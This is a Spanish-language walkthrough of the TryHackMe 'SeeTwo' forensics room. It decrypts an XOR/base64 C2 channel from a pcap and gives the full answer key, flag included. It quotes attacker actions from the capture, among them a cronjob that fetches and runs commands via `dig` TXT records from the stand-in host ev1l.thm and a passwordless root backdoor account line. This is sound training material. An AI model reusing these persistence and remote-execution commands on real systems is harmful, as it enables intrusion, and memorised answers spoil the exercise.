# SeeTwo

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Forense de red + Reverse Engineering | seetwo | https://tryhackme.com/room/seetwo | 02 Level Medium | TryHackMe | Wireshark/tshark, análisis de pcap, extracción de binario por HTTP, PyInstaller y pyinstxtractor, descompilación Python (uncompyle6/pycdc), cifrado XOR, base64, cronjobs, backdoor en Linux | Análisis de un clúster C2: recuperación de un cliente malicioso desde el pcap, ingeniería inversa de su protocolo de cifrado y descifrado de la comunicación para reconstruir las acciones del atacante sobre la víctima |

---

**Contexto:** **SeeTwo** (juego de palabras con "C2") es una sala de **análisis de tráfico e ingeniería inversa**. Se entrega la captura `capture.pcap`; en ella se aprecia una petición HTTP a `/base64_client` entre `10.0.2.64` y `10.0.2.71` que devuelve un binario en base64, junto con tráfico en el puerto **1337** (el "leet"). El binario es un cliente **PyInstaller**: con `pyinstxtractor` + `uncompyle6`/`pycdc` se recupera su código Python, que revela un **cliente C2** que conecta a `10.0.2.64:1337`, separa comandos con `AAAAAAAAAA` y los cifra con **XOR** usando la clave `MySup3rXoRKeYForCommandandControl` (además de base64). Con `tshark` se extrae el tráfico del puerto 1337, se decodifica en hex y se descifra con la misma clave para obtener todos los comandos ejecutados (lectura de `.bash_history`, conexión a MySQL como root, creación del usuario backdoor `toor`, backdoor `/usr/bin/passswd`, cronjobs con `dig ev1l.thm TXT`) y la flag final oculta en un cronjob en base64.

## Solucionario

### Task 1: Investigar un C2 visto en una captura / Investigating a C2 from a packet capture
**Explicación:** En Wireshark se ven tres conversaciones: SSH (22), HTTP (80) y algo en el puerto 1337. En el HTTP aparece `/base64_client` con una respuesta en base64 que se exporta como objeto HTTP; tras decodificarla queda un ELF de Python (bundle PyInstaller). Con `pyinstxtractor` se extraen los `.pyc` y con `uncompyle6`/`pycdc` se recupera `client.py`: un cliente C2 que recibe `encoded_image + "AAAAAAAAAA" + encoded_command`, descifra el comando con XOR (clave `MySup3rXoRKeYForCommandandControl`) + base64, lo ejecuta con `subprocess.check_output` y responde el resultado cifrado igual que el comando. Extraído el tráfico de `10.0.2.64:1337` con `tshark`, se convierte a binario con `xxd -r -p` y se descifra con la misma clave; el flujo de órdenes descubre las acciones del atacante: leer `/home/bella/.bash_history`, conectarse a MySQL, crear el usuario `toor`, dejar el binario `/usr/bin/passswd`, configurar dos cronjobs (uno con `dig ev1l.thm TXT +short @ns.ev1l.thm` y otro codificado en base64) y, finalmente, la flag.

```bash
# Extraer el cliente del pcap (Wireshark Export Objects -> HTTP) y decodificar
base64 -d base64_client > client_bin
chmod +x client_bin && file client_bin

# Ingeniería inversa del bundle PyInstaller
python pyinstxtractor.py client_bin
uncompyle6 base64_client_extracted/client.pyc > client.py
# -> cliente C2: separador 'AAAAAAAAAA', XOR + base64 con key MySup3rXoRKeYForCommandandControl

# Extraer el tráfico del canal C2 y descifrarlo
tshark -r capture.pcap -Y "ip.addr == 10.0.2.64 && tcp.port == 1337" -T fields -e tcp.payload | while read -r line; do echo "$line" | xxd -r -p | grep . ; done > ciphered_traffic.txt

python3 decrypt.py   # split('AAAAAAAAAA')[1] -> base64 -> XOR con la key
```

```python
# decrypt.py
import base64
from pwn import xor
key = b"MySup3rXoRKeYForCommandandControl"
for line in open("ciphered_traffic.txt"):
    enc = line.split("AAAAAAAAAA")[1]
    raw = base64.b64decode(enc)
    print(xor(raw, key)[:len(raw)].decode())
```

```bash
# Flag final: el cronjob en base64 se decodifica
echo "L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMu..." | base64 -d
# /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.THM{See2sNev3rGetOld}.thm)"
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the first file that is read? Enter the full path of the file. | `/home/bella/.bash_history` |
| 2 | What is the output of the file from question 1? | `mysql -u root -p'vb0xIkSGbcEKBEi'` |
| 3 | What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user. | `toor::0:0:root:/root:/bin/bash` |
| 4 | What is the name of the backdoor executable? | `/usr/bin/passswd` |
| 5 | What is the md5 hash value of the executable from question 4? | `23c415748ff840b296d0b93f98649dec` |
| 6 | What was the first cronjob that was placed by the attacker? | `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"` |
| 7 | What is the flag? | `THM{See2sNev3rGetOld}` |

### Tabla unificada / Unified table

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the first file that is read? Enter the full path of the file. | `/home/bella/.bash_history` |
| 2 | What is the output of the file from question 1? | `mysql -u root -p'vb0xIkSGbcEKBEi'` |
| 3 | What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user. | `toor::0:0:root:/root:/bin/bash` |
| 4 | What is the name of the backdoor executable? | `/usr/bin/passswd` |
| 5 | What is the md5 hash value of the executable from question 4? | `23c415748ff840b296d0b93f98649dec` |
| 6 | What was the first cronjob that was placed by the attacker? | `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"` |
| 7 | What is the flag? | `THM{See2sNev3rGetOld}` |

---

**Metodología:** Análisis del pcap (Wireshark/tshark) → identificación de la descarga HTTP del cliente → exportación y decodificación (base64) → extracción del bundle PyInstaller (`pyinstxtractor`) → descompilación de `client.py` → comprensión del protocolo C2 (XOR + base64, separador `AAAAAAAAAA`) → extracción y descifrado del tráfico del puerto 1337 → reconstrucción de los comandos del atacante → flag en el cronjob final.

**Learning chain:** Análisis de tráfico → detección de artefactos sospechosos (puerto 1337, `/base64_client`) → ingeniería inversa de Python (PyInstaller → pyc → código fuente) → reverse del cifrado XOR → descifrado del canal C2 → reconstrucción del impacto (backdoor `toor`, `/usr/bin/passswd`, cronjobs DNS) → flag.

**Lección:** *Un protocolo C2 "ofuscado" con XOR y base64 no es un obstáculo real si se recupera la clave desde el cliente: la combinación de análisis de pcap e ingeniería inversa permite descifrar el canal completo y reconstruir cada acción del atacante.*

**MITRE ATT&CK:** T1071.001 Application Layer Protocol (C2 sobre TCP/1337) · T1573.001 Encrypted Channel (Symmetric Cryptography/XOR) · T1105 Ingress Tool Transfer (descarga del binario) · T1053.003 Scheduled Task/Job (cronjob con `dig`) · T1078 Valid Accounts (creación de `toor`) · T1001 Data Obfuscation (base64/XOR) · T1059.004 Command and Scripting Interpreter.

**Fuente:** [TryHackMe - SeeTwo](https://tryhackme.com/room/seetwo)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.